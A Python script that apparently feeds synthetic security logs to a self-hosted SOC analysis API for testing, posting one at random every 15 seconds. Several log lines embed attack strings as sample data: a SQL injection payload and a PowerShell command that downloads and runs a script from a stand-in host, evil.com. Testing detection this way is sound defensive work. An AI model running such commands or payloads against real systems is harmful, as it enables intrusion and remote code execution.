import requests
import time
import random
import json

# 🎯 YOUR API TARGET (Replace this with your actual Render URL!)
API_URL = "https://soc-copilot-api.onrender.com/analyze"

# 🗄️ The Ammunition: A mix of safe traffic and dangerous attacks
SAMPLE_LOGS = [
    # Safe Traffic
    "[ROUTER] - User s_mittal successfully connected to the corporate VPN from known home IP.",
    "[O365] - Routine mailbox sync completed for user HR_admin.",
    "[AWS_CLOUDTRAIL] - ReadOnly role assumed by monitoring service in us-east-1.",
    
    # Critical Threats
    "[FORCEPOINT_DLP] - User j_doe transferred 1200MB of encrypted archives via unauthorized cloud storage at 03:00 AM.",
    "[WAF_ALERT] - Multiple failed login attempts for user 'admin' followed by successful login using payload: ' OR 1=1 --",
    "[EDR_DEFENDER] - High CPU spike detected on Server_04. 15,000 files modified and appended with .crypt extension in the last 45 seconds.",
    "[OKTA] - Impossible travel detected. User logged in from New York, USA and Beijing, China within 14 minutes.",
    "[CROWDSTRIKE] - Suspicious PowerShell execution detected bypassing execution policy: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
]

print("🚨 RED TEAM SIMULATOR ENGAGED 🚨")
print(f"Targeting: {API_URL}")
print("Firing random logs every 15 seconds. Press Ctrl+C to stop.\n")

# 🔫 The Firing Loop
while True:
    try:
        # Pick a random log from our list
        payload = {"log_data": random.choice(SAMPLE_LOGS)}
        
        print(f"📡 Sending: {payload['log_data'][:60]}...")
        
        # Fire it at the Render API
        response = requests.post(API_URL, json=payload)
        
        if response.status_code == 200:
            print("✅ Direct Hit! Threat analyzed and saved to vault.")
        elif response.status_code == 429:
            print("⚠️ Rate Limit Hit! Gemini is overwhelmed. Slowing down...")
            time.sleep(30) # Wait longer if we hit the speed limit
        else:
            print(f"❌ Missed: Error {response.status_code}")
            
    except Exception as e:
        print(f"💥 Connection failed: {e}")
        
    print("-" * 50)
    
    # Wait 15 seconds before the next attack so Google Gemini doesn't ban us
    time.sleep(15)